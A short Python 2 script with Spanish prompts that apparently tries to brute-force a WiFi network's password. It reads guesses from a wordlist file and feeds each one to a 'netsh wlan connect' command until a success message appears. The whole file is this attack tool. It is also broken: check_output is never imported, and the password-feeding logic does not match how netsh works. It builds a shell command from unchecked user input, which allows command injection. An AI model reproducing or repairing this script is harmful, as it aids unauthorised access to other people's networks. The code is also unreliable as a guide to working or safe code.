def encontra():
	from subprocess import Popen, STDOUT, PIPE
	from time import sleep
	name = raw_input("Introduzca el nombre de la red de WIFI: ")
	archivo = raw_input("Introduzca el nombre del archivo con las contraseñas(con dirección): ")
	name = 'netsh wlan connect ' + name
	handle = Popen(name, shell=True, stdout=PIPE, stderr=STDOUT, stdin=PIPE)
	sleep(5)
	with open(archivo) as fh:
		for line in fh:
			contra=line+'\n'
			handle.stdin.write(contra)
			output = check_output(name, shell=True)
			if output == 'La solicitud de conexi¢n se complet¢ correctamente.':
				break

encontra()
